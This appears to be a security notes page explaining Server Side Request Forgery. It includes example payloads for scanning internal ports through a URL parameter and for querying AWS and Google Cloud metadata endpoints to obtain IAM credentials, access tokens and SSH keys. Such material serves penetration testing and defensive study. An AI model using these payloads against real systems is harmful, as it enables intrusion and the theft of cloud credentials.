SSRF- Server Side Request Forgery

Description:

Server Side Request Forgery (SSRF) is a type of attack that can be carried out to compromise a server. The exploitation of a SSRF vulnerability enables attackers to send requests made by the web application, often targeting internal systems behind a firewall. Sometimes a server needs to make URL-request based on user input. A clear example would be an import-function, where you can import images from a URL, perhaps when setting a profile picture. When you as a user enter a URL, the server will make a request to that URL and fetch the image. 

What we can do with SSRF:
```
Scan the network for hosts,
Port scan internal machines and fingerprint internal services,
collect instance metadata,
bypass access controls,
leak confidential data,
and even execute code on reachable machines.
```

Port scan and Service Fingerprinting:  
```
We can use private IP address and loopback address for port scan [Reserved IP list](https://en.wikipedia.org/wiki/Reserved_IP_addresses)  
?url=10.0.0.1:80 --> Error: cannot upload image: http-server-header: Apache/2.2.8 (Ubuntu) DAV/2  
?url=10.0.0.1:11 --->  Error: cannot upload image: Connection Failed  
Check with [default port](https://packetlife.net/media/library/23/common-ports.pdf) and invalid ports.  
Means port 80 was open and port 11 is invalid. We can identify by server response, status code and server response timing.    
```
Leak aws meta data:
```
http://169.254.169.254/latest/meta-data/ returns the list of available metadata that you can query.
http://169.254.169.254/latest/meta-data/local-hostname/ returns the internal hostname used by the host.
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME returns the security credentials of that role.
http://169.254.169.254/latest/dynamic/instance-identity/document reveals the private IP address of the current instance.
http://169.254.169.254/latest/user-data/ returns user data on the current instance. 
```

Leak Google cloud meta data:

Add following header if the request is processed properly


“Metadata-Flavor: Google” or “X-Google-Metadata-Request: True” 


```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token returns the access token of the default account on the instance. 

http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-key returns public SSH keys that can connect to other instances in this project. 
```

Other cloud meta data [link](https://gist.github.com/BuffaloWill/fa96693af67e3a3dd3fb)

